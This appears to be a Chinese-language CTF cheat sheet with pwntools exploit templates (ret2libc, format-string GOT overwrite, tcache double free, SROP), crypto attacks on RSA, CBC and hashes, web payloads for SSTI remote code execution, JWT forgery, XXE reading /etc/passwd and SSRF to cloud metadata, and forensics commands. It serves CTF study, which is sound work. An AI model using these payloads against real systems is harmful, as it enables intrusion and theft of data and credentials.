# CTF 技术参考

## Pwn — 二进制漏洞利用

### pwntools 基础框架

```python
from pwn import *

# 连接
p = process("./target")
p = remote("host", port)
p = gdb.debug("./target", gdbscript="b main\nc")

# 上下文
context.arch = "amd64"   # i386 / arm / aarch64 / mips
context.os   = "linux"
context.log_level = "debug"

# ELF 分析
elf = ELF("./target")
libc = ELF("./libc.so.6")
print(hex(elf.got["printf"]))   # GOT 地址
print(hex(elf.plt["printf"]))   # PLT 地址
print(hex(elf.symbols["main"])) # 符号地址

# 发送/接收
p.send(payload)
p.sendline(payload)
p.sendafter(b"prompt:", payload)
p.recvuntil(b":")
p.recvline()
p.recv(8)
p.interactive()

# ROP
rop = ROP(elf)
rop.raw(0x401000)
rop.call("puts", [elf.got["puts"]])
rop.call("main")
print(rop.dump())
payload = flat(rop)
```

### 栈溢出

```python
# 1. 找偏移
offset = cyclic_find(0x6161616c)  # 从崩溃的 RSP/EIP 值找
# 或 pwndbg: cyclic 200 → 触发崩溃 → cyclic -l 0x6161616c

# 2. ret2libc (64位)
payload  = b"A" * offset
payload += p64(pop_rdi)       # gadget: pop rdi; ret
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])  # leak puts@libc
payload += p64(main_addr)        # 回到 main 再次利用

# 3. 计算 libc 基址
puts_leak = u64(p.recvuntil(b"\n")[:-1].ljust(8, b"\x00"))
libc.address = puts_leak - libc.symbols["puts"]
system = libc.symbols["system"]
binsh  = next(libc.search(b"/bin/sh\x00"))

# 4. getshell
payload  = b"A" * offset
payload += p64(ret_gadget)    # 栈对齐 (Ubuntu 18+需要)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
```

### 格式化字符串

```python
# 泄露栈/libc 地址
# 格式：%N$p 读第 N 个参数（栈上的值）
payload = b"%p.%p.%p.%p.%p.%p"  # 依次泄露
payload = b"%7$p"                 # 直接读第7个

# 任意地址读
payload = fmtstr_payload(offset, {addr: 0})  # pwntools 自动计算
# 或手动：addr + b"%N$s"  读 addr 处字符串

# 任意地址写（GOT 劫持）
writes = {elf.got["exit"]: system_addr}
payload = fmtstr_payload(offset, writes)

# 找格式化字符串偏移
# 输入 AAAA.%p.%p... 找到 0x41414141 的位置
```

### 堆利用

```python
# tcache dup (glibc 2.27-2.31)
# 1. double free → tcache 链表损坏
free(chunk_a)
free(chunk_a)           # 无检查直接 double free
# 2. 控制 fd 指针
malloc(size)            # 返回 chunk_a
edit(chunk_a, target_addr)  # 写 fd = 目标地址
malloc(size)            # 返回 chunk_a（消耗一次）
malloc(size)            # 返回 target_addr

# house of botcake (glibc 2.32+)
# 绕过 tcache key 检查的 double free

# 常用堆调试
# pwndbg: heap / bins / vis_heap_chunks / malloc_chunk addr

# libc 版本判断
# 泄露 __malloc_hook 或 main_arena 地址 → 查 libc database
# https://libc.blukat.me / https://libc.rip
```

### SROP (Sigreturn Oriented Programming)

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = b"A" * offset
payload += p64(syscall_addr)   # 触发 sigreturn
payload += bytes(frame)
```

### 常用 Gadget 查找

```bash
ROPgadget --binary target --rop
ROPgadget --binary libc.so.6 --string "/bin/sh"
one_gadget libc.so.6          # 一键 getshell gadget
```

---

## Crypto

```python
# RSA 基础
from Crypto.Util.number import *
from sympy import factorint

# 小公钥指数攻击 (e=3)
import gmpy2
c = ...
for i in range(10000000):
    m, exact = gmpy2.iroot(c + i * n, 3)
    if exact:
        print(long_to_bytes(m))

# 共模攻击 (同一明文，不同 n 但相同 e)
from sympy.core.numbers import igcdex
g, s, t = igcdex(e1, e2)
m = pow(c1, s, n) * pow(c2, t, n) % n

# RSA 分解 (小 n)
import factordb
factors = factorint(n)

# CRT
from Crypto.Util.number import inverse
p, q = factors
phi = (p-1)*(q-1)
d = inverse(e, phi)
m = pow(c, d, n)

# AES CBC 翻转攻击
# 修改 C[i-1] 的某字节 → 影响 P[i] 对应字节
# P[i][j] = D(C[i])[j] XOR C[i-1][j]
# 目标: P'[i][j] = X → C'[i-1][j] = C[i-1][j] XOR P[i][j] XOR X

# Padding Oracle
from paddingoracle import BadPaddingException, PaddingOracle
# 自动化: https://github.com/mwielgoszewski/python-paddingoracle

# 哈希长度扩展
import hlextend
sha = hlextend.new('sha256')
new_msg, new_sig = sha.extend(append_data, known_msg, key_len, known_sig)

# XOR 分析
from itertools import cycle
key = bytes([a ^ b for a, b in zip(ct1, ct2)])  # 两段 OTP XOR
```

---

## Web CTF

```python
import requests

s = requests.Session()
s.proxies = {"http": "http://127.0.0.1:8080"}  # 走 Burp

# SSTI 测试 payload
payloads = [
    "{{7*7}}",                    # 通用检测
    "{{config}}",                 # Flask 配置泄露
    "{{''.__class__.__mro__[1].__subclasses__()}}", # 类遍历
    # RCE
    "{{''.__class__.__mro__[1].__subclasses__()[子类索引].__init__.__globals__['os'].popen('id').read()}}",
    # Jinja2 沙箱逃逸
    "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
]

# SQL 注入
import sqlmap  # 命令行: sqlmap -u "url" --dbs --batch

# JWT 攻击
import jwt
# 算法混淆: HS256 用 RS256 公钥签名
token = jwt.encode(payload, public_key, algorithm="HS256")
# none 算法
header = base64url({"alg":"none","typ":"JWT"})
fake = header + "." + base64url(payload) + "."

# XXE
xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

# SSRF bypass
# http://127.0.0.1 → http://0177.0.0.1 / http://2130706433
# http://169.254.169.254 AWS metadata
```

---

## Misc / Forensics

```bash
# 文件类型识别
file suspicious
xxd suspicious | head -20
binwalk suspicious              # 内嵌文件提取
binwalk -e suspicious           # 自动提取

# 图片隐写
strings image.png | grep -i flag
zsteg image.png                 # PNG/BMP LSB
steghide extract -sf image.jpg  # JPEG 隐写
stegsolve                       # GUI 多通道分析
exiftool image.jpg              # EXIF 数据

# 流量分析
tshark -r capture.pcap -T fields -e data.data  # 提取数据
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.uri
# Wireshark: Statistics → Follow TCP/HTTP Stream

# 内存取证
volatility -f memory.raw imageinfo
volatility -f memory.raw --profile=Win7SP1x64 pslist
volatility -f memory.raw --profile=Win7SP1x64 cmdline
volatility -f memory.raw --profile=Win7SP1x64 filescan | grep flag
volatility -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x... -D out/

# 磁盘取证
autopsy                         # GUI
mmls disk.img                   # 分区表
fls -r -o offset disk.img       # 文件列表（含删除）
icat -o offset disk.img inode   # 恢复文件
```
